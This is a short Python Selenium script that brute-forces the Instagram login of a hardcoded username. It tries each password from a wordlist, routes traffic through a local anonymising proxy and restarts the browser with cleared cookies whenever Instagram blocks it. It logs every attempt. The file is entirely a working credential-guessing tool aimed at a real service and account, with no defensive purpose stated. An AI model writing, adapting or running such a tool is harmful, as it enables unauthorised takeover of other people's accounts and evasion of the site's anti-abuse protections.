#!/usr/bin/python
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time

username = 'redhootcp'
delay = 0
passwords = [ '666666' ]

report_file = 'report.log'
used_passwords_file = 'used_passes.txt'

def login():
    driver.get('https://www.instagram.com/accounts/login/?force_classic_login')
    assert "Instagram" in driver.title
    elem = driver.find_element_by_name("username")
    elem.clear()
    elem.send_keys(username)
    elem = driver.find_element_by_name("password")
    elem.clear()
    elem.send_keys(password)
    elem.send_keys(Keys.RETURN)
#    time.sleep(delay)

def browser_config():
    profile = webdriver.FirefoxProfile()
    profile.set_preference("network.proxy.http", "localhost")
    profile.set_preference("network.proxy.http_port", 8118)
    profile.set_preference("network.proxy.no_proxies_on", "")
    profile.set_preference("network.proxy.ssl", "localhost")
    profile.set_preference("network.proxy.ssl_port", 8118)
    profile.set_preference("network.proxy.type", 1)
    return profile

with open('wordlist.txt', 'r') as f:
    passwords = f.readlines()


profile = browser_config()
report = open(report_file, 'wt')
used_passes = open(used_passwords_file, 'wt')
driver = webdriver.Firefox(profile)

for line in passwords:
    password = line.rstrip()
    login()
    print "%s %s %s " % (time.strftime("%Y-%m-%d %H:%M"), driver.title, password)
    report.write("%s %s \n" % (time.strftime("%Y-%m-%d %H:%M"), password))

    if 'Page Not Found' in driver.title:
        while ('Page Not Found' in driver.title):
            driver.close()
            time.sleep(10)
            driver = webdriver.Firefox()
            driver.delete_all_cookies()
            print "%s %s %s " % (time.strftime("%Y-%m-%d %H:%M"), driver.title, password)
            report.write("%s %s \n" % (time.strftime("%Y-%m-%d %H:%M"), password))
            login()
    used_passes.write("%s\n" % password)
report.close()
used_passes.close()
